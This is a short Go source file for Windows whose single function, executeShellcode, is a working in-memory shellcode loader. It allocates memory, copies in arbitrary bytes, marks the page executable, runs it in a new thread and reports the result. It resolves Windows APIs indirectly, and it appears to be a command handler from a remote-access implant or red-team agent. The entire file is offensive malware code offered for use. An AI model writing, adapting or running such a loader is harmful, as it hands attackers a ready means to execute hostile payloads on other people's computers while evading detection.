//go:build windows

package main

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

const (
	INFINITE = 0xFFFFFFFF
)

func executeShellcode(data []byte) string {
	if len(data) == 0 {
		return "Error: empty shellcode"
	}

	va := getProc(mKernel32, fVirtualAlloc)
	addr, _, err := syscall.SyscallN(va,
		0,
		uintptr(len(data)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if addr == 0 {
		return fmt.Sprintf("Error: VirtualAlloc failed: %v", err)
	}

	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(data)), data)

	var oldProtect uint32
	syscall.SyscallN(rpVirtualProtect, addr, uintptr(len(data)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	ct := getProc(mKernel32, fCreateThread)
	var threadID uint32
	thread, _, err := syscall.SyscallN(ct,
		0,
		0,
		addr,
		0,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if thread == 0 {
		vf := getProc(mKernel32, fVirtualFree)
		syscall.SyscallN(vf, addr, 0, MEM_RELEASE)
		return fmt.Sprintf("Error: CreateThread failed: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(thread))

	wfso := getProc(mKernel32, fWaitForSingleObject)
	ret, _, _ := syscall.SyscallN(wfso, thread, uintptr(30*time.Second/time.Millisecond))
	if ret == 0x00000102 {
		return "Shellcode executing (thread still running after 30s)"
	}

	vf := getProc(mKernel32, fVirtualFree)
	syscall.SyscallN(vf, addr, 0, MEM_RELEASE)
	return fmt.Sprintf("Shellcode executed (%d bytes)", len(data))
}
